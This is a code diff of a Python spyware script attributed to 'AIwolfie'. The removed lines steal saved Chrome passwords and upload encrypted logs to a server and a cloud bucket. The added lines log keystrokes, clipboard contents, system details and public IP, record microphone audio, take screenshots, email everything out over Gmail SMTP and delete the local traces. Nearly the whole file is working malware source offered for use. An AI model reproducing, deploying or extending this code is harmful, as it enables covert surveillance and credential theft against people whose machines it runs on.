@@ -1,162 +1,186 @@
+# Author: AIwolfie
+
 import os
 import time
-import sqlite3
-import shutil
-import requests
-import logging
-import threading
-import hashlib
-from datetime import datetime
+import socket
+import platform
+import getpass
+from requests import get
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+import win32clipboard
+from pynput.keyboard import Key, Listener
+from scipy.io.wavfile import write
+import sounddevice as sd
 from cryptography.fernet import Fernet
-import configparser
-import zlib
-from google.cloud import storage
+from multiprocessing import freeze_support
+from PIL import ImageGrab
 
-# Load configurations from an external config file
-config = configparser.ConfigParser()
-config.read(os.path.expanduser("~/.keylogger_config.ini"))
+# File names
+key_log_file = "keystrokes.txt"
+system_info_file = "sys_info.txt"
+clipboard_file = "clipboard_data.txt"
+audio_recording_file = "recorded_audio.wav"
+screenshot_file = "screenshot_capture.png"
 
-SERVER_URL = config.get("Server", "URL", fallback="https://your-server-url.com/upload")
-encryption_key = config.get("Encryption", "Key", fallback=Fernet.generate_key().decode()).encode()
+encrypted_files = {
+    "keys": "enc_keystrokes.txt",
+    "system": "enc_sys_info.txt",
+    "clipboard": "enc_clipboard_data.txt"
+}
 
-GCS_BUCKET_NAME = config.get("GoogleCloud", "BucketName", fallback="your_bucket_name")
-GCS_KEY_FILE = config.get("GoogleCloud", "KeyFile", fallback="path/to/your/service-account-key.json")
+record_duration = 10  # Seconds for audio recording
+log_interval = 15     # Interval for each logging session (seconds)
+session_count = 3     # Number of logging sessions
 
-# Log file details
-log_dir = os.path.expanduser("~/.keylogger_logs")
-os.makedirs(log_dir, exist_ok=True)
-log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+email_sender = ""  # Enter disposable email here
+email_password = ""  # Enter email password here
+recipient_email = ""  # Email to send logs to
+encryption_key = ""  # Enter encryption key
 
-# Internal logging for debugging
-internal_log = os.path.join(log_dir, "internal_log.txt")
-logging.basicConfig(filename=internal_log, level=logging.DEBUG, format='%(asctime)s - %(message)s')
+log_directory = ""  # Set the directory for saving logs
+path_separator = "\\"
+log_path = log_directory + path_separator
 
-cipher_suite = Fernet(encryption_key)
-
-# Function to retrieve Chrome passwords
-def get_chrome_passwords():
+# the Email function
+def send_email(subject, filename, filepath, recipient):
     try:
-        chrome_data_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
-        temp_db = os.path.join(log_dir, "temp_db")
+        msg = MIMEMultipart()
+        msg['From'] = email_sender
+        msg['To'] = recipient
+        msg['Subject'] = subject
 
-        shutil.copy2(chrome_data_path, temp_db)
+        body = "Find the attached file."
+        msg.attach(MIMEText(body, 'plain'))
 
-        conn = sqlite3.connect(temp_db)
-        cursor = conn.cursor()
+        with open(filepath, 'rb') as attachment:
+            payload = MIMEBase('application', 'octet-stream')
+            payload.set_payload(attachment.read())
+        encoders.encode_base64(payload)
+        payload.add_header('Content-Disposition', f'attachment; filename={filename}')
+        msg.attach(payload)
 
-        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-        logins = cursor.fetchall()
+        with smtplib.SMTP('smtp.gmail.com', 587) as server:
+            server.starttls()
+            server.login(email_sender, email_password)
+            server.sendmail(email_sender, recipient, msg.as_string())
 
-        with open(log_file, "a") as file:
-            for login in logins:
-                file.write(f"{datetime.now()} - URL: {login[0]}, Username: {login[1]}, Password: {login[2]}\n")
-
-        conn.close()
-        os.remove(temp_db)
     except Exception as e:
-        logging.error(f"Failed to retrieve Chrome passwords: {e}")
+        print(f"Email sending failed: {e}")
 
-# Function to compress logs
-def compress_logs():
+# This Gathers system information
+def log_system_info():
     try:
-        with open(log_file, "rb") as file:
-            compressed_data = zlib.compress(file.read())
-        with open(log_file, "wb") as file:
-            file.write(compressed_data)
+        with open(log_path + system_info_file, "w") as sys_file:
+            sys_file.write(f"User: {getpass.getuser()}\n")
+            sys_file.write(f"Hostname: {socket.gethostname()}\n")
+            sys_file.write(f"Private IP: {socket.gethostbyname(socket.gethostname())}\n")
+            try:
+                public_ip = get("https://api.ipify.org").text
+                sys_file.write(f"Public IP: {public_ip}\n")
+            except Exception:
+                sys_file.write("Public IP: Unavailable\n")
+            sys_file.write(f"System: {platform.system()} {platform.version()}\n")
+            sys_file.write(f"Processor: {platform.processor()}\n")
+            sys_file.write(f"Machine: {platform.machine()}\n")
     except Exception as e:
-        logging.error(f"Failed to compress logs: {e}")
+        print(f"System info logging failed: {e}")
 
-# Function to encrypt logs
-def encrypt_logs():
+# This Records clipboard data
+def log_clipboard():
     try:
-        with open(log_file, "rb") as file:
-            encrypted_data = cipher_suite.encrypt(file.read())
-        with open(log_file, "wb") as file:
-            file.write(encrypted_data)
-    except Exception as e:
-        logging.error(f"Failed to encrypt logs: {e}")
+        with open(log_path + clipboard_file, "w") as clip_file:
+            win32clipboard.OpenClipboard()
+            clipboard_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+            clip_file.write(f"Clipboard Content:\n{clipboard_data}")
+    except:
+        with open(log_path + clipboard_file, "w") as clip_file:
+            clip_file.write("Clipboard data unavailable.")
 
-# Function to verify log file integrity
-def verify_log_integrity():
+# Capture audio
+def record_audio():
     try:
-        with open(log_file, "rb") as file:
-            data = file.read()
-        checksum = hashlib.sha256(data).hexdigest()
-        logging.info(f"Log file checksum: {checksum}")
-        return checksum
+        fs = 44100
+        audio = sd.rec(int(record_duration * fs), samplerate=fs, channels=2)
+        sd.wait()
+        write(log_path + audio_recording_file, fs, audio)
     except Exception as e:
-        logging.error(f"Failed to verify log integrity: {e}")
-        return None
+        print(f"Audio recording failed: {e}")
 
-# Function to send logs to a server
-def send_logs_to_server():
-    retries = 3
-    for attempt in range(retries):
+# Take a screenshot
+def capture_screenshot():
+    try:
+        screenshot = ImageGrab.grab()
+        screenshot.save(log_path + screenshot_file)
+    except Exception as e:
+        print(f"Screenshot capture failed: {e}")
+
+# Log keystrokes
+def log_keystrokes():
+    def on_press(key):
         try:
-            with open(log_file, "rb") as file:
-                files = {"file": ("keylog.txt", file)}
-                response = requests.post(SERVER_URL, files=files)
-
-            if response.status_code == 200:
-                logging.info("Logs sent to server successfully.")
-                break
-            else:
-                logging.warning(f"Failed to send logs: {response.status_code}, {response.text}")
+            with open(log_path + key_log_file, "a") as key_file:
+                if hasattr(key, 'char') and key.char:
+                    key_file.write(key.char)
+                elif key == Key.space:
+                    key_file.write(' ')
+                else:
+                    key_file.write(f'[{key}]')
         except Exception as e:
-            logging.error(f"Error in sending logs to server: {e}")
-        time.sleep(5)
-    else:
-        logging.error("Failed to send logs after multiple attempts.")
+            print(f"Keystroke logging error: {e}")
 
-# Function to send logs to Google Cloud Storage
-def send_logs_to_gcs():
+    def on_release(key):
+        if key == Key.esc:
+            return False
+
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+# Encrypt files
+def encrypt_files():
     try:
-        # Initialize the Google Cloud Storage client
-        client = storage.Client.from_service_account_json(GCS_KEY_FILE)
-        bucket = client.bucket(GCS_BUCKET_NAME)
-        blob = bucket.blob(os.path.basename(log_file))
-
-        # Upload the log file
-        blob.upload_from_filename(log_file)
-
-        logging.info("Logs uploaded to Google Cloud Storage successfully.")
-    except FileNotFoundError:
-        logging.error("Log file not found for GCS upload.")
+        cipher = Fernet(encryption_key)
+        for original, encrypted in zip([system_info_file, clipboard_file, key_log_file], encrypted_files.values()):
+            with open(log_path + original, 'rb') as original_file:
+                encrypted_data = cipher.encrypt(original_file.read())
+            with open(log_path + encrypted, 'wb') as encrypted_file:
+                encrypted_file.write(encrypted_data)
     except Exception as e:
-        logging.error(f"Error uploading logs to GCS: {e}")
+        print(f"Encryption failed: {e}")
 
-# Function to rotate internal logs
-def rotate_internal_logs():
-    try:
-        if os.path.exists(internal_log) and os.path.getsize(internal_log) > 1024 * 1024:  # 1MB
-            rotated_log = internal_log + ".1"
-            if os.path.exists(rotated_log):
-                os.remove(rotated_log)
-            os.rename(internal_log, rotated_log)
-    except Exception as e:
-        logging.error(f"Failed to rotate internal logs: {e}")
+# Clean up log files
+def clean_up_logs():
+    for file in [system_info_file, clipboard_file, key_log_file, screenshot_file, audio_recording_file]:
+        try:
+            os.remove(log_path + file)
+        except Exception as e:
+            print(f"Cleanup failed for {file}: {e}")
 
-# Function to run the script in the background
-def run_in_background():
-    try:
-        if not os.path.isfile(log_file):
-            logging.error("Log file does not exist.")
-            return
+# Main execution loop
+def main():
+    log_system_info()
+    log_clipboard()
+    record_audio()
+    capture_screenshot()
 
-        rotate_internal_logs()
+    session_counter = 0
+    while session_counter < session_count:
+        log_keystrokes()
+        capture_screenshot()
+        send_email("Screenshot Captured", screenshot_file, log_path + screenshot_file, recipient_email)
+        session_counter += 1
 
-        get_chrome_passwords()
+    encrypt_files()
+    for enc_file in encrypted_files.values():
+        send_email("Encrypted Log", enc_file, log_path + enc_file, recipient_email)
 
-        compress_logs()
-        encrypt_logs()
-        verify_log_integrity()
-        send_logs_to_server()
-        send_logs_to_gcs()
+    time.sleep(60)
+    clean_up_logs()
 
-        os.remove(log_file)
-    except Exception as e:
-        logging.error(f"Background execution failed: {e}")
-
-# Entry point
 if __name__ == "__main__":
-    threading.Thread(target=run_in_background, daemon=True).start()
+    freeze_support()
+    main()
